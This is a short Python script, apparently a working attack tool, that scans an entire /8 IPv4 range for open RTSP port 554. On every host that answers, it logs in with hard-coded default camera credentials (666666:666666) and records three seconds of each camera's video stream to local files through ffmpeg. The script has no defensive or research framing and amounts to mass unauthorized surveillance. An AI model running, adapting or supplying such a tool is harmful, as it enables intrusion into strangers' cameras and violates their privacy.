import socket
import subprocess
import shlex
import sys
from concurrent.futures import ThreadPoolExecutor


try:
    faixa = sys.argv[1]
except Exception as err:
    print(err)
    sys.exit()


def testaip(dest):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(1)
        result = sock.connect_ex((dest, 554))
        if result == 0:
            sock.close()
            subprocess.Popen(shlex.split(f'ffmpeg -hide_banner -loglevel error -timeout 1 -t 3 -i "rtsp://666666:666666@{dest}/cam/realmonitor?channel=1&subtype=0" -acodec copy -vcodec copy {dest}.mp4'))
            return 'ok'
        else:
            sock.close()
            return 'erro'


def multi_process(ipe):
    try:
        with ThreadPoolExecutor() as executor:
            executor.submit(testaip, ipe)
    except Exception as err:
        print(err)
        sys.exit()


j = 0
while j <= 255:
    x = 0
    while x <= 255:
        i = 0
        while i < 255:
            ip = f'{faixa}.{j}.{x}.{i}'
            multi_process(ip)
            i += 1
        x += 1
    j += 1
